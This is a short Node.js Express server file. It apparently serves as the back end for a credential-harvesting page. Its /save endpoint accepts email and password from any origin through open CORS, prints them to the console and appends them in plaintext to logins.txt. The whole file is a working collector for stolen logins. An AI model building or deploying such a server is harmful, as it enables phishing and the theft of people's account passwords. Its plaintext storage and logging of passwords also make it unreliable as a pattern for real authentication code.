const express = require("express");
const fs = require("fs");
const cors = require("cors");

const app = express();
const PORT = 3000;

app.use(express.json());
app.use(cors());

app.post("/save", (req, res) => {
    const credentials = req.body;

    console.log("Received login:");
    console.log("Email:", credentials.email);
    console.log("Password:", credentials.password);

    // Save credentials to logins.txt
    fs.appendFileSync("logins.txt", `Email: ${credentials.email}, Password: ${credentials.password}\n`);

    res.status(200).send("Credentials received");
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});

